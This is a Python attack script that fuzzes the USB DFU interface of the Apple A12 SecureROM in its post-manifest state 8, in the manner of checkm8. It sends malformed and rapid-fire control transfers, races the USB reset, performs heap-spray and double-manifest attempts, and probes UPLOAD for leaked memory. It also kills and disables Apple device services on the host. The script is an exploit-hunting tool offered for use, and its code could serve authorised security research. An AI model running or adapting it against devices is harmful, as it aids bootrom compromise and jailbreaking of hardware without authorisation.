#!/usr/bin/env python3
"""
A12 SecureROM — State 8 ("Death Star Trench Run") Attack
=========================================================
Hypothesis: When the device is in state 8 (MANIFEST-WAIT-RESET),
the SecureROM has finished manifest processing but hasn't cleaned up yet.
The USB stack is still alive. If we send unexpected USB traffic BEFORE
the USB reset, we might hit:
  - Use-after-free (structures freed but still referenced)
  - Double-free (our request + reset both try to free)
  - Heap corruption (DNLOAD allocates while old buffer is in limbo)
  - Unexpected code path (DFU handler not expecting traffic in state 8)

This is conceptually similar to checkm8's UAF during DFU abort,
but targeting the post-manifest window instead.

Strategy:
  1. Trigger manifest → reach state 8
  2. BEFORE sending USB reset, bombard with various USB operations
  3. Check if the device crashes, behaves differently, or leaks data
  4. Also race: send traffic DURING the USB reset
"""
import time, os, struct, json, traceback
from datetime import datetime
from pathlib import Path

import usb.core, usb.util, libusb_package, usb.backend.libusb1

APPLE_VID = 0x05AC; DFU_PID = 0x1227
BE = usb.backend.libusb1.get_backend(find_library=libusb_package.find_library)
RESULTS = []

def log(msg):
    print(f"[{datetime.now().strftime('%H:%M:%S.%f')[:-3]}] {msg}", flush=True)

def find_dfu():
    return usb.core.find(idVendor=APPLE_VID, idProduct=DFU_PID, backend=BE)

def gs(dev):
    """GET_STATUS → (state, status, poll_timeout_ms)"""
    try:
        r = dev.ctrl_transfer(0xA1, 3, 0, 0, 6, timeout=1000)
        return (r[4], r[0], r[1]|(r[2]<<8)|(r[3]<<16)) if len(r) >= 6 else None
    except: return None

def dn(dev, data, to=5000):
    try: dev.ctrl_transfer(0x21, 1, 0, 0, data, timeout=to); return True
    except: return False

def ab(dev):
    try: dev.ctrl_transfer(0x21, 6, 0, 0, 0, timeout=1000); return True
    except: return False

def clr(dev):
    try: dev.ctrl_transfer(0x21, 4, 0, 0, 0, timeout=1000); return True
    except: return False

def upload(dev, length=256):
    try: return bytes(dev.ctrl_transfer(0xA1, 2, 0, 0, length, timeout=1000))
    except: return None

def detach(dev):
    try: dev.ctrl_transfer(0x21, 0, 0, 0, 0, timeout=1000); return True
    except: return False

def get_state(dev):
    """DFU_GETSTATE (not GET_STATUS)"""
    try:
        r = dev.ctrl_transfer(0xA1, 5, 0, 0, 1, timeout=1000)
        return r[0] if len(r) >= 1 else None
    except: return None

def ctrl_raw(dev, bmRequestType, bRequest, wValue, wIndex, data_or_len, timeout=1000):
    """Generic USB control transfer — catches all errors"""
    try:
        r = dev.ctrl_transfer(bmRequestType, bRequest, wValue, wIndex, data_or_len, timeout=timeout)
        return ("ok", bytes(r) if hasattr(r, '__len__') else r)
    except usb.core.USBError as e:
        return ("err", str(e))
    except Exception as e:
        return ("exc", str(e))

def to_idle(dev, max_attempts=30):
    for _ in range(max_attempts):
        s = gs(dev)
        if not s: return None
        if s[0] == 2: return dev
        if s[0] == 10: clr(dev)
        elif s[0] == 5: ab(dev)
        elif s[0] in (3, 6): gs(dev)
        elif s[0] == 7: time.sleep(0.01)
        elif s[0] == 8:
            try: dev.reset()
            except: pass
            time.sleep(1.5)
            dev2 = find_dfu()
            if dev2:
                try: dev2.set_configuration()
                except: pass
                dev = dev2
                continue
            return None
        elif s[0] == 4: time.sleep(0.1)
        else: ab(dev)
        time.sleep(0.02)
    return None

def wait_idle(timeout=60):
    t0 = time.time()
    while time.time() - t0 < timeout:
        dev = find_dfu()
        if dev:
            try: dev.set_configuration()
            except: pass
            dev = to_idle(dev)
            if dev:
                s = gs(dev)
                if s and s[0] == 2:
                    return dev
        time.sleep(0.3)
    return None

def trigger_manifest(dev):
    """Send payload + trigger manifest → should reach state 8.
    Returns (dev, success, states_seen)"""
    # DNLOAD 2048 zeros
    if not dn(dev, bytes(2048)):
        return dev, False, []
    s = gs(dev)
    if not s or s[0] != 5:
        return dev, False, [s[0] if s else -1]
    
    # Zero-length DNLOAD → triggers manifest
    if not dn(dev, b""):
        return dev, False, [5]
    
    # Poll until state 8
    states = []
    for _ in range(50):
        s = gs(dev)
        if not s: break
        states.append(s[0])
        if s[0] == 8: return dev, True, states
        if s[0] == 2: return dev, False, states  # went back to idle
        if s[0] == 10: return dev, False, states
        time.sleep(0.0005)
    
    return dev, (8 in states), states

def check_alive():
    """Check if DFU device is still on the bus"""
    try: return find_dfu() is not None
    except: return False

def record(test_name, detail, result, alive, notes=""):
    entry = {
        "test": test_name, "detail": detail, "result": result,
        "alive": alive, "notes": notes
    }
    RESULTS.append(entry)
    marker = ""
    if not alive: marker = " *** CRASH ***"
    elif "unusual" in notes.lower(): marker = " [!]"
    log(f"  {test_name:25s} {detail:20s} → {result:15s} alive={alive}{marker}")

def recover(dev):
    """Recover from state 8 and return to IDLE. Returns new dev or None."""
    try: dev.reset()
    except: pass
    time.sleep(1.5)
    dev2 = find_dfu()
    if dev2:
        try: dev2.set_configuration()
        except: pass
        return to_idle(dev2)
    return wait_idle(15)

# ============================================================
#  ATTACK TESTS
# ============================================================

def test_1_dfu_commands_in_state8(dev):
    """Test all DFU commands while in state 8"""
    log("\n===== TEST 1: DFU Commands in State 8 =====")
    
    tests = [
        ("GET_STATUS",    lambda d: gs(d)),
        ("GET_STATE",     lambda d: get_state(d)),
        ("ABORT",         lambda d: ab(d)),
        ("CLR_STATUS",    lambda d: clr(d)),
        ("DETACH",        lambda d: detach(d)),
        ("UPLOAD_64",     lambda d: upload(d, 64)),
        ("UPLOAD_256",    lambda d: upload(d, 256)),
        ("UPLOAD_2048",   lambda d: upload(d, 2048)),
        ("DNLOAD_0",      lambda d: dn(d, b"")),
        ("DNLOAD_16",     lambda d: dn(d, bytes(16))),
        ("DNLOAD_2048",   lambda d: dn(d, bytes(2048))),
        ("DNLOAD_4096",   lambda d: dn(d, bytes(4096))),
        ("DNLOAD_DEADBEEF", lambda d: dn(d, b"\xDE\xAD\xBE\xEF" * 512)),
    ]
    
    for name, action in tests:
        # Get fresh state 8
        dev = to_idle(dev) or wait_idle(15)
        if not dev: log("Lost device"); return None
        
        dev, ok, states = trigger_manifest(dev)
        if not ok:
            log(f"  {name}: couldn't reach state 8 (states={states})")
            continue
        
        # Verify we're in state 8
        s = gs(dev)
        if not s or s[0] != 8:
            log(f"  {name}: not in state 8 (got {s})")
            continue
        
        # === THE ATTACK: send command while in state 8 ===
        try:
            result = action(dev)
            result_str = repr(result)[:60]
        except Exception as e:
            result_str = f"EXCEPTION: {e}"
        
        alive = check_alive()
        
        # Check state after
        s_after = gs(dev) if alive else None
        state_after = s_after[0] if s_after else -1
        
        notes = ""
        if state_after not in (8, -1):
            notes = f"unusual: state changed to {state_after}"
        if not alive:
            notes = "DEVICE CRASHED"
        
        record(name, f"state_after={state_after}", result_str, alive, notes)
        
        # Recover
        if alive:
            dev = recover(dev)
        else:
            log(f"  !!! {name} CRASHED THE DEVICE !!!")
            time.sleep(3)
            dev = wait_idle(20)
        
        if not dev:
            log("Can't recover — aborting test 1")
            return None
    
    return dev


def test_2_rapid_fire_in_state8(dev):
    """Send many rapid commands in state 8 before it has time to react"""
    log("\n===== TEST 2: Rapid-Fire in State 8 =====")
    
    sequences = [
        ("5x_GET_STATUS",  [(0xA1, 3, 0, 0, 6)] * 5),
        ("5x_DNLOAD_0",    [(0x21, 1, 0, 0, b"")] * 5),
        ("5x_ABORT",       [(0x21, 6, 0, 0, 0)] * 5),
        ("DN+AB+DN+AB+DN", [
            (0x21, 1, 0, 0, bytes(2048)),
            (0x21, 6, 0, 0, 0),
            (0x21, 1, 0, 0, bytes(2048)),
            (0x21, 6, 0, 0, 0),
            (0x21, 1, 0, 0, bytes(2048)),
        ]),
        ("GS+DN+GS+DN+GS", [
            (0xA1, 3, 0, 0, 6),
            (0x21, 1, 0, 0, bytes(2048)),
            (0xA1, 3, 0, 0, 6),
            (0x21, 1, 0, 0, bytes(2048)),
            (0xA1, 3, 0, 0, 6),
        ]),
        ("UPLOAD_after_DN", [
            (0x21, 1, 0, 0, b"\xDE\xAD\xBE\xEF" * 16),
            (0xA1, 2, 0, 0, 256),  # UPLOAD — might read back from buffer?
        ]),
    ]
    
    for name, seq in sequences:
        dev = to_idle(dev) or wait_idle(15)
        if not dev: log("Lost device"); return None
        
        dev, ok, states = trigger_manifest(dev)
        if not ok:
            log(f"  {name}: couldn't reach state 8"); continue
        
        # Rapid fire!
        results = []
        for rt, req, val, idx, data in seq:
            try:
                r = dev.ctrl_transfer(rt, req, val, idx, data, timeout=1000)
                results.append(("ok", bytes(r) if hasattr(r, '__len__') else r))
            except usb.core.USBError as e:
                results.append(("err", str(e)))
            except Exception as e:
                results.append(("exc", str(e)))
        
        alive = check_alive()
        s_after = gs(dev) if alive else None
        state_after = s_after[0] if s_after else -1
        
        short = "; ".join(f"{r[0]}:{str(r[1])[:20]}" for r in results)
        notes = ""
        if state_after not in (8, -1): notes = f"state changed to {state_after}!"
        if not alive: notes = "CRASHED"
        
        record(name, f"st={state_after}", short[:60], alive, notes)
        
        # Check UPLOAD results for non-zero data
        for i, (rt, req, val, idx, data) in enumerate(seq):
            if req == 2 and results[i][0] == "ok":  # UPLOAD
                up_data = results[i][1]
                if up_data and any(b != 0 for b in up_data):
                    log(f"  !!! UPLOAD returned non-zero data: {up_data[:32].hex()}")
        
        dev = recover(dev) if alive else wait_idle(15)
        if not dev: log("Can't recover — aborting test 2"); return None
    
    return dev


def test_3_race_reset(dev):
    """Send traffic RIGHT as we trigger the USB reset — race the cleanup"""
    log("\n===== TEST 3: Race the USB Reset =====")
    log("Strategy: trigger USB reset, then immediately send DNLOAD")
    
    for trial in range(5):
        dev = to_idle(dev) or wait_idle(15)
        if not dev: return None
        
        dev, ok, _ = trigger_manifest(dev)
        if not ok: continue
        
        # Send USB reset + immediately try DNLOAD
        try:
            dev.reset()
        except: pass
        
        # Immediately try to send data — race the reset handling
        time.sleep(0.001)  # 1ms after reset
        dev2 = find_dfu()
        if dev2:
            try: dev2.set_configuration()
            except: pass
            
            # Before the device finishes resetting, try DNLOAD
            dn_ok = dn(dev2, bytes(2048), to=500)
            s = gs(dev2)
            state = s[0] if s else -1
            alive = check_alive()
            record("reset_race", f"T{trial} 1ms", f"dn={dn_ok} st={state}", alive)
            dev = dev2
        else:
            # Device not back yet — try reconnecting
            time.sleep(0.5)
            dev2 = find_dfu()
            if dev2:
                try: dev2.set_configuration()
                except: pass
                dn_ok = dn(dev2, bytes(2048), to=500)
                s = gs(dev2)
                state = s[0] if s else -1
                alive = check_alive()
                record("reset_race", f"T{trial} 501ms", f"dn={dn_ok} st={state}", alive)
                dev = dev2
            else:
                record("reset_race", f"T{trial}", "no_device", False, "device gone")
                dev = wait_idle(15)
                if not dev: return None
        
        dev = to_idle(dev) or wait_idle(10)
        if not dev: return None
    
    return dev


def test_4_stall_recovery_in_state8(dev):
    """Trigger a STALL in state 8 and see what happens during recovery"""
    log("\n===== TEST 4: STALL Recovery in State 8 =====")
    
    # wIndex != 0 causes STALL (from usb_attack_suite findings)
    stall_requests = [
        ("wIndex=1",      0x21, 1, 0, 1, bytes(64)),
        ("wIndex=0xFF",   0x21, 1, 0, 0xFF, bytes(64)),
        ("bad_bReq=0x10", 0x21, 0x10, 0, 0, bytes(0)),
        ("bad_bReq=0xFF", 0x21, 0xFF, 0, 0, bytes(0)),
        ("SET_INTERFACE",  0x01, 0x0B, 0, 0, 0),    # USB standard SET_INTERFACE
        ("GET_DESCRIPTOR", 0x80, 0x06, 0x0100, 0, 64),  # GET_DESCRIPTOR(device)
        ("SET_ADDRESS",    0x00, 0x05, 0x02, 0, 0),     # USB SET_ADDRESS(2)
        ("vendor_IN",      0xC0, 0x01, 0, 0, 64),       # vendor-specific IN
        ("vendor_OUT",     0x40, 0x01, 0, 0, bytes(64)), # vendor-specific OUT
    ]
    
    for name, rt, req, val, idx, data in stall_requests:
        dev = to_idle(dev) or wait_idle(15)
        if not dev: return None
        
        dev, ok, _ = trigger_manifest(dev)
        if not ok: continue
        
        # Send weird request in state 8
        status, result = ctrl_raw(dev, rt, req, val, idx, data)
        alive = check_alive()
        s_after = gs(dev) if alive else None
        state_after = s_after[0] if s_after else -1
        
        notes = ""
        if status == "ok": notes = "ACCEPTED!"  # unexpected in state 8
        if state_after not in (8, -1): notes += f" state→{state_after}"
        if not alive: notes = "CRASHED"
        
        record("stall_s8", name, f"{status}:{str(result)[:30]}", alive, notes)
        
        if not alive:
            log(f"  !!! {name} CRASHED THE DEVICE IN STATE 8 !!!")
            dev = wait_idle(20)
        else:
            dev = recover(dev)
        if not dev: return None
    
    return dev


def test_5_heap_spray_state8(dev):
    """Heap spray: rapidly allocate+free in state 8 to corrupt heap metadata"""
    log("\n===== TEST 5: Heap Spray in State 8 =====")
    
    spray_patterns = [
        ("rapid_alloc_free", 20),
        ("big_then_small", 10),
        ("alternating_sizes", 10),
    ]
    
    for pattern, reps in spray_patterns:
        dev = to_idle(dev) or wait_idle(15)
        if not dev: return None
        
        dev, ok, _ = trigger_manifest(dev)
        if not ok: continue
        
        results = []
        try:
            if pattern == "rapid_alloc_free":
                for i in range(reps):
                    r1 = dn(dev, bytes(2048))
                    r2 = ab(dev)
                    results.append(f"dn={r1},ab={r2}")
            
            elif pattern == "big_then_small":
                for i in range(reps):
                    r1 = dn(dev, bytes(4096))  # big
                    r2 = ab(dev)
                    r3 = dn(dev, bytes(16))    # small
                    r4 = ab(dev)
                    results.append(f"big={r1},ab={r2},sm={r3},ab={r4}")
            
            elif pattern == "alternating_sizes":
                sizes = [16, 4096, 64, 2048, 8, 1024]
                for sz in sizes:
                    r1 = dn(dev, bytes(sz))
                    r2 = ab(dev)
                    results.append(f"sz={sz}:dn={r1},ab={r2}")
        except Exception as e:
            results.append(f"EXCEPTION: {e}")
        
        alive = check_alive()
        s_after = gs(dev) if alive else None
        state_after = s_after[0] if s_after else -1
        
        summary = "; ".join(results[-3:])  # last 3
        notes = ""
        if state_after not in (8, -1): notes = f"state→{state_after}"
        if not alive: notes = "CRASHED"
        
        record("heap_spray", pattern, f"st={state_after} {summary[:50]}", alive, notes)
        
        if not alive:
            log(f"  !!! HEAP SPRAY CRASHED THE DEVICE !!!")
            dev = wait_idle(20)
        else:
            dev = recover(dev)
        if not dev: return None
    
    return dev


def test_6_upload_leak_state8(dev):
    """Try UPLOAD in state 8 — might read back freed buffer contents"""
    log("\n===== TEST 6: UPLOAD Data Leak in State 8 =====")
    
    # First: DNLOAD known pattern, trigger manifest, then UPLOAD in state 8
    patterns = [
        ("after_zeros",   bytes(2048)),
        ("after_0xAA",    bytes([0xAA] * 2048)),
        ("after_0xDEAD",  b"\xDE\xAD\xBE\xEF" * 512),
        ("after_IMG4",    b"\x30\x82\x07\xF6\x16\x04IMG4" + bytes(2038)),
    ]
    
    for name, payload in patterns:
        dev = to_idle(dev) or wait_idle(15)
        if not dev: return None
        
        # DNLOAD our pattern
        dn(dev, payload)
        s = gs(dev)
        if not s or s[0] != 5: continue
        
        # Trigger manifest
        dn(dev, b"")
        
        # Wait for state 8
        for _ in range(50):
            s = gs(dev)
            if not s or s[0] == 8: break
            time.sleep(0.0005)
        
        if not s or s[0] != 8:
            log(f"  {name}: not state 8"); continue
        
        # UPLOAD in state 8 — does it return anything?
        for up_len in [64, 256, 2048]:
            data = upload(dev, up_len)
            alive = check_alive()
            
            if data and len(data) > 0:
                nonzero = sum(1 for b in data if b != 0)
                record("upload_leak", f"{name} len={up_len}",
                       f"got {len(data)}B, {nonzero} nonzero, first={data[:16].hex()}",
                       alive, "DATA LEAKED!" if nonzero > 0 else "")
                if nonzero > 0:
                    log(f"  !!! UPLOAD LEAKED {nonzero} non-zero bytes!")
                    log(f"      First 64B: {data[:64].hex()}")
            else:
                record("upload_leak", f"{name} len={up_len}",
                       f"got {len(data) if data else 0}B" if data else "None",
                       alive)
            
            if not alive:
                dev = wait_idle(15)
                break
        
        if check_alive():
            dev = recover(dev)
        else:
            dev = wait_idle(15)
        if not dev: return None
    
    return dev


def test_7_double_manifest_state8(dev):
    """In state 8, try to trigger ANOTHER manifest — double processing"""
    log("\n===== TEST 7: Double Manifest from State 8 =====")
    
    for trial in range(3):
        dev = to_idle(dev) or wait_idle(15)
        if not dev: return None
        
        dev, ok, _ = trigger_manifest(dev)
        if not ok: continue
        
        # In state 8: try DNLOAD → zero DNLOAD → GET_STATUS (re-trigger manifest!)
        r1 = dn(dev, bytes(2048))
        s1 = gs(dev)
        st1 = s1[0] if s1 else -1
        
        # If we got to state 5 from state 8, we broke the state machine!
        if st1 == 5:
            log(f"  !!! STATE 8 → DNLOAD → STATE 5: state machine broken !!!")
            # Try triggering second manifest
            r2 = dn(dev, b"")
            states2 = []
            for _ in range(50):
                s = gs(dev)
                if not s: break
                states2.append(s[0])
                if s[0] in (2, 8, 10): break
                time.sleep(0.0005)
            
            alive = check_alive()
            record("double_manifest", f"T{trial}",
                   f"dn={r1} st1={st1} m2_states={states2}", alive,
                   "STATE MACHINE BROKEN — double manifest possible!")
        else:
            alive = check_alive()
            record("double_manifest", f"T{trial}",
                   f"dn={r1} st1={st1}", alive,
                   "DFU rejected" if st1 == 8 else f"state→{st1}")
        
        if not alive:
            log("  !!! DOUBLE MANIFEST CRASHED THE DEVICE !!!")
            dev = wait_idle(20)
        else:
            dev = recover(dev)
        if not dev: return None
    
    return dev


def test_8_abort_during_manifest_then_attack(dev):
    """Don't wait for state 8 — ABORT during state 6/7, then attack the leftover state"""
    log("\n===== TEST 8: ABORT During Manifest + Attack =====")
    
    for trial in range(5):
        dev = to_idle(dev) or wait_idle(15)
        if not dev: return None
        
        # DNLOAD + trigger manifest
        dn(dev, bytes(2048))
        s = gs(dev)
        if not s or s[0] != 5: continue
        dn(dev, b"")
        
        # DON'T poll to state 8 — immediately ABORT!
        ab_ok = ab(dev)
        s = gs(dev)
        state_after_abort = s[0] if s else -1
        
        log(f"  T{trial}: abort_during_manifest={ab_ok} state_after={state_after_abort}")
        
        # Now try various attacks in this potentially confused state
        if state_after_abort == 2:
            # Back to idle — abort worked, but is the heap clean?
            # Try UPLOAD — might read leftover manifest buffer
            data = upload(dev, 2048)
            if data and any(b != 0 for b in data):
                log(f"  !!! UPLOAD after abort leaked data: {data[:32].hex()}")
                record("abort_manifest", f"T{trial}", f"leak: {data[:16].hex()}", True, "DATA LEAKED")
            else:
                record("abort_manifest", f"T{trial}", f"st={state_after_abort} no_leak", True)
        
        elif state_after_abort in (6, 7):
            # Caught during manifest! Try DNLOAD to overwrite buffer
            dn_ok = dn(dev, b"\xDE\xAD\xBE\xEF" * 512)
            s2 = gs(dev)
            st2 = s2[0] if s2 else -1
            alive = check_alive()
            record("abort_manifest", f"T{trial} mid-manifest",
                   f"dn={dn_ok} st2={st2}", alive,
                   "MID-MANIFEST OVERWRITE" if dn_ok else "")
        
        elif state_after_abort == 10:
            # Error state
            clr(dev)
            record("abort_manifest", f"T{trial}", "error_state→clr", True)
        
        else:
            alive = check_alive()
            record("abort_manifest", f"T{trial}", f"st={state_after_abort}", alive)
            if not alive:
                dev = wait_idle(15)
                continue
        
        alive = check_alive()
        if alive:
            dev = to_idle(dev) or wait_idle(10)
        else:
            dev = wait_idle(15)
        if not dev: return None
    
    return dev


def run():
    log("=" * 60)
    log("A12 SecureROM — State 8 'Trench Run' Attack")
    log("=" * 60)
    log("Target: USB operations during MANIFEST-WAIT-RESET")
    log("Goal: Find UAF, heap corruption, state machine bugs")
    log("")
    
    # Kill Apple services
    for p in ["iTunesHelper", "iTunes", "AppleMobileDeviceService",
              "usbmuxd", "AMPDeviceDiscoveryAgent", "AppleMobileDeviceHelper"]:
        os.system(f'taskkill /F /IM "{p}.exe" >nul 2>&1')
    os.system('sc config "Apple Mobile Device Service" start=disabled >nul 2>&1')
    os.system('net stop "Apple Mobile Device Service" >nul 2>&1')
    
    log("Waiting for DFU device... Enter DFU mode now!")
    dev = wait_idle(120)
    if not dev:
        log("FATAL: No device found"); return
    
    s = gs(dev)
    log(f"Device found, state={s}")
    log("")
    
    # Run all tests
    try:
        dev = test_1_dfu_commands_in_state8(dev)
        if dev: dev = test_2_rapid_fire_in_state8(dev)
        if dev: dev = test_3_race_reset(dev)
        if dev: dev = test_4_stall_recovery_in_state8(dev)
        if dev: dev = test_5_heap_spray_state8(dev)
        if dev: dev = test_6_upload_leak_state8(dev)
        if dev: dev = test_7_double_manifest_state8(dev)
        if dev: dev = test_8_abort_during_manifest_then_attack(dev)
    except Exception as e:
        log(f"FATAL ERROR: {e}")
        traceback.print_exc()
    
    # Save results
    log("\n" + "=" * 60)
    log("RESULTS SUMMARY")
    log("=" * 60)
    
    crashes = [r for r in RESULTS if not r["alive"]]
    unusual = [r for r in RESULTS if r["notes"] and "unusual" in r["notes"].lower()]
    leaks = [r for r in RESULTS if "leak" in r["notes"].lower()]
    accepted = [r for r in RESULTS if "ACCEPTED" in r["notes"]]
    
    log(f"Total tests: {len(RESULTS)}")
    log(f"CRASHES: {len(crashes)}")
    log(f"Data leaks: {len(leaks)}")
    log(f"Unusual states: {len(unusual)}")
    log(f"Unexpected ACCEPT: {len(accepted)}")
    
    if crashes:
        log("\n--- CRASHES ---")
        for r in crashes:
            log(f"  {r['test']} / {r['detail']}: {r['result']}")
    
    if leaks:
        log("\n--- DATA LEAKS ---")
        for r in leaks:
            log(f"  {r['test']} / {r['detail']}: {r['result']}")
    
    if accepted:
        log("\n--- UNEXPECTED ACCEPTS ---")
        for r in accepted:
            log(f"  {r['test']} / {r['detail']}: {r['result']}")
    
    # Save JSON
    outdir = Path(__file__).parent / "results"
    outdir.mkdir(exist_ok=True)
    outfile = outdir / "state8_attack.json"
    with open(outfile, "w") as f:
        json.dump({"timestamp": datetime.now().isoformat(), "results": RESULTS}, f, indent=2)
    log(f"\nResults saved to {outfile}")
    
    # Re-enable Apple services
    os.system('sc config "Apple Mobile Device Service" start=auto >nul 2>&1')
    log("\n=== TRENCH RUN COMPLETE ===")


if __name__ == "__main__":
    run()
